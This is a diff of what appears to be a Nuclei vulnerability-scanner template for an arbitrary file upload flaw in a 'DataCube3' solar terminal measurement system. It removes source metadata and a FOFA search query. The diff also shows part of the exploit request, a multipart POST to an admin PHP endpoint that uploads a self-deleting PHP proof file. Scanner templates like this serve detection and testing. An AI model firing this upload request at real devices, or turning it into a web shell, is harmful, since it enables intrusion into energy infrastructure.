@@ -3,12 +3,8 @@ info:
   name: Japan太阳能系统DataCube3终端测量系统存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pbuztxiyoafmnu2p'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pbuztxiyoafmnu2p
-    fofa: title=="DataCube3"
 http:
 - raw:
   - 'POST /admin/transceiver_schedule.php?usb_schedule HTTP/1.1
@@ -44,8 +40,6 @@ http:
     <?php print_r(md5(123456));unlink(__FILE__);?>
 
     ------WebKitFormBoundary2okM2XNcEINQCOiN4jrZ5I3gQVG--
-
-
 
 
     上传定位：'
